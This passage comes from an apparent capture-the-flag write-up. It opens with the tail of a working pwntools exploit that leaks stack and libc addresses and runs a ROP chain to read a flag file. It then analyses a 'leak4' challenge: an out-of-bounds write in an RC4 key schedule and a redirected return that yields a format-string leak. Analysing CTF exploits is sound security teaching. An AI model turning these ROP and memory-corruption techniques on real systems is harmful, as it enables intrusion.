<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>

<span class="n">gdbscript</span><span class="o">=</span><span class="sh">"""</span><span class="s">
b*0x0000000000401338
b*0x00000000004013B1
b*0x4013eb
</span><span class="sh">"""</span>

<span class="k">def</span> <span class="nf">run</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">])</span>
        <span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">api</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">ssl</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">p</span>

<span class="n">p</span> <span class="o">=</span> <span class="nf">run</span><span class="p">()</span>
<span class="n">info</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">msg</span><span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
<span class="n">success</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">msg</span><span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">msg</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sna</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">msg</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="n">data</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
<span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">msg</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">data</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
<span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">msg</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
<span class="n">rl</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">().</span><span class="nf">strip</span><span class="p">()</span>
<span class="n">rn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">n</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvn</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>

<span class="n">rbp</span> <span class="o">=</span> <span class="mh">0x000000000040121d</span>
<span class="n">main</span> <span class="o">=</span> <span class="mh">0x0000000000401413</span>
<span class="nf">sa</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">name?</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">16</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">16</span><span class="p">)</span>
<span class="n">stack</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvn</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span><span class="p">))</span>
<span class="nf">success</span><span class="p">(</span><span class="sh">"</span><span class="s">stack </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">))</span>
<span class="nf">sa</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">else?</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">B</span><span class="sh">"</span><span class="o">*</span><span class="mi">96</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x401359</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x76</span><span class="sh">'</span><span class="p">)</span>

<span class="nf">sa</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">name?</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">24</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">24</span><span class="p">)</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span> <span class="o">-</span> <span class="mi">171382</span>
<span class="nf">success</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">libc base: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">=</span> <span class="nc">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
<span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">pop rdi</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">pop_rsi</span> <span class="o">=</span> <span class="n">rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">pop rsi</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">pop_rdx_rbx</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x00000000000904a9</span>
<span class="n">pop_rax</span> <span class="o">=</span> <span class="n">rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">pop rax</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">ret</span> <span class="o">=</span> <span class="n">pop_rdi</span> <span class="o">+</span> <span class="mi">1</span>

<span class="n">openat</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">'</span><span class="s">openat</span><span class="sh">'</span><span class="p">]</span>
<span class="n">getdents64</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">'</span><span class="s">getdents64</span><span class="sh">'</span><span class="p">]</span> 
<span class="n">write</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">'</span><span class="s">write</span><span class="sh">'</span><span class="p">]</span>
<span class="n">read_plt</span> <span class="o">=</span> <span class="n">exe</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="sh">'</span><span class="s">read</span><span class="sh">'</span><span class="p">]</span>
<span class="n">sendfile</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">'</span><span class="s">sendfile</span><span class="sh">'</span><span class="p">]</span>

<span class="n">bss</span> <span class="o">=</span> <span class="mh">0x404100</span>
<span class="n">path</span> <span class="o">=</span> <span class="n">bss</span>
<span class="n">buff</span> <span class="o">=</span> <span class="n">bss</span> <span class="o">+</span> <span class="mh">0x100</span>
<span class="n">buf_sz</span> <span class="o">=</span> <span class="mh">0x100</span>
<span class="n">AT_FDCWD</span> <span class="o">=</span> <span class="o">-</span><span class="mi">100</span> 
<span class="n">O_DIRECTORY</span> <span class="o">=</span> <span class="mh">0x10000</span>
<span class="n">O_RDONLY</span> <span class="o">=</span> <span class="mi">0</span>

<span class="c1"># listfile = flat(
#     pop_rdi, 0,
#     pop_rsi, path,
#     pop_rdx_rbx, 0x100, 0,
#     read_plt,
</span>
<span class="c1">#     # 2) fd = openat(AT_FDCWD, PATH, O_DIRECTORY, 0)
#     pop_rdi, AT_FDCWD,
#     pop_rsi, path,
#     pop_rdx_rbx, O_DIRECTORY, 0,
#     openat,
</span>
<span class="c1">#     # 3) getdents64(fd=3, BUF, BUFSZ)
#     pop_rdi, 3,
#     pop_rsi, buff,
#     pop_rdx_rbx, buf_sz, 0,
#     getdents64,
</span>
<span class="c1">#     # 4) write(1, BUF, BUFSZ)
#     pop_rdi, 1,
#     pop_rsi, buff,
#     pop_rdx_rbx, buf_sz, 0,
#     write,
# )
</span>
<span class="c1"># sa(b"name?\n", b"A"*16)
# payload = b"B"*96 + b"C"*8 + listfile
# sa(b"else?\n", payload)
</span>
<span class="c1"># pause()
# s(b"/\x00")
</span>
<span class="n">orw</span> <span class="o">=</span> <span class="nf">flat</span><span class="p">(</span>
    <span class="n">pop_rdi</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">pop_rsi</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span>
    <span class="n">pop_rdx_rbx</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">read_plt</span><span class="p">,</span>

    <span class="c1"># 2)
</span>    <span class="n">pop_rdi</span><span class="p">,</span> <span class="n">AT_FDCWD</span><span class="p">,</span>
    <span class="n">pop_rsi</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span>
    <span class="n">pop_rdx_rbx</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">openat</span><span class="p">,</span>

    <span class="c1"># 3) 
</span>    <span class="n">pop_rdi</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span>
    <span class="n">pop_rsi</span><span class="p">,</span> <span class="n">buff</span><span class="p">,</span>
    <span class="n">pop_rdx_rbx</span><span class="p">,</span> <span class="n">buf_sz</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">read_plt</span><span class="p">,</span>

    <span class="c1"># 4) write(1, BUF, BUFSZ) 
</span>    <span class="n">pop_rdi</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span>
    <span class="n">pop_rsi</span><span class="p">,</span> <span class="n">buff</span><span class="p">,</span>
    <span class="n">pop_rdx_rbx</span><span class="p">,</span> <span class="n">buf_sz</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">write</span><span class="p">,</span>
<span class="p">)</span>

<span class="nf">sa</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">name?</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">16</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">B</span><span class="sh">"</span><span class="o">*</span><span class="mi">96</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">C</span><span class="sh">"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">orw</span>
<span class="nf">sa</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">else?</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="nf">pause</span><span class="p">()</span>
<span class="nf">s</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">./flag</span><span class="se">\x00</span><span class="sh">"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</pre></table></code></div></div></details><p>Flag: <code class="language-plaintext highlighter-rouge">flag{OerBsSljF3pcjeKMrR2j1Bh8evAMeYZK}</code></p><hr /><h2 id="finals-leak4"><span class="me-2">[Finals] leak4</span><a href="#finals-leak4" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="analysis-1"><span class="me-2">Analysis</span><a href="#analysis-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Source: <a href="/assets/mimic/leak4/chal">pwn</a> / <a href="/assets/mimic/leak4/libc.so.6">libc</a> / <a href="/assets/mimic/leak4/ld-linux-x86-64.so.2">ld</a></p><p>Init fun setup I/O and disable execve/execveat:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="kr">__cdecl</span> <span class="nf">init</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">_bss_start</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">disable_execve</span><span class="p">();</span>
  <span class="n">alarm</span><span class="p">(</span><span class="mh">0x3Cu</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="kr">__cdecl</span> <span class="nf">disable_execve</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">scmp_filter_ctx</span> <span class="n">ctx</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]</span>

  <span class="n">ctx</span> <span class="o">=</span> <span class="p">(</span><span class="n">scmp_filter_ctx</span><span class="p">)</span><span class="n">seccomp_init</span><span class="p">(</span><span class="mi">2147418112</span><span class="p">);</span>
  <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">322</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">seccomp_load</span><span class="p">(</span><span class="n">ctx</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">perror</span><span class="p">(</span><span class="s">"seccomp_load"</span><span class="p">);</span>
    <span class="n">seccomp_release</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">seccomp_release</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>seccomp-tools dump ./chal
 line  CODE  JT   JF      K
<span class="o">=================================</span>
 0000: 0x20 0x00 0x00 0x00000004  A <span class="o">=</span> <span class="nb">arch
 </span>0001: 0x15 0x00 0x06 0xc000003e  <span class="k">if</span> <span class="o">(</span>A <span class="o">!=</span> ARCH_X86_64<span class="o">)</span> goto 0008
 0002: 0x20 0x00 0x00 0x00000000  A <span class="o">=</span> sys_number
 0003: 0x35 0x00 0x01 0x40000000  <span class="k">if</span> <span class="o">(</span>A &lt; 0x40000000<span class="o">)</span> goto 0005
 0004: 0x15 0x00 0x03 0xffffffff  <span class="k">if</span> <span class="o">(</span>A <span class="o">!=</span> 0xffffffff<span class="o">)</span> goto 0008
 0005: 0x15 0x02 0x00 0x0000003b  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> execve<span class="o">)</span> goto 0008
 0006: 0x15 0x01 0x00 0x00000142  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> execveat<span class="o">)</span> goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  <span class="k">return </span>ALLOW
 0008: 0x06 0x00 0x00 0x00000000  <span class="k">return </span>KILL
</pre></table></code></div></div><p>The program follows a standard RC4 encryption routine structure:</p><ul class="nolineno"><li><code class="language-plaintext highlighter-rouge">main()</code>: Allocates a struct protect1 on the heap, reads a Key, initializes the RC4 state array S with value 0-127, schedules the key, reads Data, and encrypts it.<div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="mo">00000000</span> <span class="k">struct</span> <span class="n">protect1</span> <span class="c1">// sizeof=0x100</span>
<span class="mo">00000000</span> <span class="p">{</span>
<span class="mo">00000000</span>     <span class="kt">char</span> <span class="n">input</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
<span class="mo">000000</span><span class="mi">80</span>     <span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
<span class="mo">00000100</span> <span class="p">};</span>
</pre></table></code></div></div></ul><ul><li><p><code class="language-plaintext highlighter-rouge">key_schedule()</code>: The KSA (Key Scheduling Algorithm) phase of RC4. It permutes the state array S based on the user-provided key.</p><li><p><code class="language-plaintext highlighter-rouge">rc4_crypt()</code>: The PRGA (Pseudo-Random Generation Algorithm) phase. It generates the keystream and XORs it with the data.</p></ul><p>In <code class="language-plaintext highlighter-rouge">key_schedule()</code>, there’s a OOB bug when computing idx <code class="language-plaintext highlighter-rouge">j</code>:</p><div class="language-c nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="n">i_1</span><span class="p">]</span> <span class="o">+</span> <span class="n">j</span> <span class="o">+</span> <span class="n">input2</span><span class="p">[</span><span class="n">i_1</span><span class="p">])</span> <span class="o">%</span> <span class="mi">128</span><span class="p">;</span>
</pre></table></code></div></div><p>Both <code class="language-plaintext highlighter-rouge">buf</code> and <code class="language-plaintext highlighter-rouge">input2</code> are signed char which range is typically -128 to 127. The <code class="language-plaintext highlighter-rouge">%</code> operator keeps the sign of the dividend so j can be negative. Because j is bounded by [-127, 127], the out-of-bounds region is limited to a window of up to 127 bytes below S[0], but this is still enough to corrupt important stack values. And after debugging, I found that at offset <code class="language-plaintext highlighter-rouge">-40</code> we can overwrite the return address of <code class="language-plaintext highlighter-rouge">key_schedule()</code> or overwrite <code class="language-plaintext highlighter-rouge">rbp</code> with offset <code class="language-plaintext highlighter-rouge">-48</code>.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="kr">__cdecl</span> <span class="nf">key_schedule</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">input</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">input2</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">inputlen</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">tmp</span><span class="p">;</span> <span class="c1">// [rsp+2Fh] [rbp-A1h]</span>
  <span class="kt">int</span> <span class="n">j</span><span class="p">;</span> <span class="c1">// [rsp+30h] [rbp-A0h]</span>
  <span class="kt">int</span> <span class="n">i_0</span><span class="p">;</span> <span class="c1">// [rsp+34h] [rbp-9Ch]</span>
  <span class="kt">int</span> <span class="n">i_1</span><span class="p">;</span> <span class="c1">// [rsp+38h] [rbp-98h]</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">136</span><span class="p">];</span> <span class="c1">// [rsp+40h] [rbp-90h] BYREF</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// [rsp+C8h] [rbp-8h]</span>

  <span class="n">v8</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i_0</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i_0</span> <span class="o">&lt;=</span> <span class="mi">127</span><span class="p">;</span> <span class="o">++</span><span class="n">i_0</span> <span class="p">)</span>
    <span class="n">buf</span><span class="p">[</span><span class="n">i_0</span><span class="p">]</span> <span class="o">=</span> <span class="n">input</span><span class="p">[</span><span class="n">i_0</span> <span class="o">%</span> <span class="n">inputlen</span><span class="p">];</span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i_1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i_1</span> <span class="o">&lt;=</span> <span class="mi">127</span><span class="p">;</span> <span class="o">++</span><span class="n">i_1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="n">i_1</span><span class="p">]</span> <span class="o">+</span> <span class="n">j</span> <span class="o">+</span> <span class="n">input2</span><span class="p">[</span><span class="n">i_1</span><span class="p">])</span> <span class="o">%</span> <span class="mi">128</span><span class="p">;</span>
    <span class="n">tmp</span> <span class="o">=</span> <span class="n">input2</span><span class="p">[</span><span class="n">i_1</span><span class="p">];</span>
    <span class="n">input2</span><span class="p">[</span><span class="n">i_1</span><span class="p">]</span> <span class="o">=</span> <span class="n">input2</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
    <span class="n">input2</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><hr /><h3 id="exploitation-1"><span class="me-2">Exploitation</span><a href="#exploitation-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Checksec results:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>checksec
File:     /mnt/d/ctf/mimic/2025/final/leak4/chal_patched
Arch:     amd64
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
RUNPATH:    b<span class="s1">'.'</span>
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
Debuginfo:  Yes
</pre></table></code></div></div><p>Again, I think they don’t actually enforce SHSTK/IBT in this challenge.</p><p>I also noticed that when <code class="language-plaintext highlighter-rouge">key_schedule()</code> return, the register <code class="language-plaintext highlighter-rouge">rdi</code> still holds our first argument, which is the pointer to our input buffer(p-&gt;input). By overwriting the return address of <code class="language-plaintext highlighter-rouge">key_schedule()</code> to point to the <code class="language-plaintext highlighter-rouge">printf("Enter the key-&gt;")</code> call inside main (e.g. <code class="language-plaintext highlighter-rouge">main+0x3b</code>), we effectively call printf with our input buffer as the format string. That turns this into a format string vulnerability, which can be used to leak stack and libc addresses.</p><p>Note that the key_schedule-based OOB write is mathematically limited. The RC4 state S is initialized as <code class="language-plaintext highlighter-rouge">S[i] = i</code> for <code class="language-plaintext highlighter-rouge">0 ≤ i &lt; 128</code> and only permuted by swaps; it never stores values outside <code class="language-plaintext highlighter-rouge">0..127</code>. Since our out-of-bounds writes are always <code class="language-plaintext highlighter-rouge">input2[j] = tmp</code> where tmp is one element of S, the bytes we can write outside the array are also restricted to the range <code class="language-plaintext highlighter-rouge">0x00..0x7f</code>. Moreover, the index j is computed as (buf[i] + j + S[i]) % 128 using signed char and signed %, so j is always in [-127, 127]. This means we can only corrupt a small window of stack memory around S, and at each location we can only place a value from 0..127. As a result, we need a bit brute-force to find the right input key to overwrite the target addresses.</p><p>After that, we can overwrite the lower two bytes of <code class="language-plaintext highlighter-rouge">rbp</code> (with some bruteforce) to change where <code class="language-plaintext highlighter-rouge">p</code> is stored. My first idea was to tweak <code class="language-plaintext highlighter-rouge">p</code> so that we could overwrite the return address of <code class="language-plaintext highlighter-rouge">rc4_crypt()</code> and jump directly into a ROP chain. However, in practice it was quite hard to control both the value and the key cleanly, so I took a step back and looked for a nicer target. That’s when I noticed an interesting pointer in stack. Let’s look at <code class="language-plaintext highlighter-rouge">leave; ret</code> of <code class="language-plaintext highlighter-rouge">key_schedule()</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>target ptr: 0x7fff64cc3e00 —▸ 0x7fff64cc3e10
RBP  0x7fff64cc3ec0 —▸ overwrited by us
0x644da6b6d5c0 &lt;key_schedule+513&gt;    leave
0x644da6b6d5c1 &lt;key_schedule+514&gt;    ret    
</pre></table></code></div></div><p>From the stack layout of main, we know:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="o">-</span><span class="mo">0000000000000130</span>
<span class="o">-</span><span class="mo">0000000000000130</span>     <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
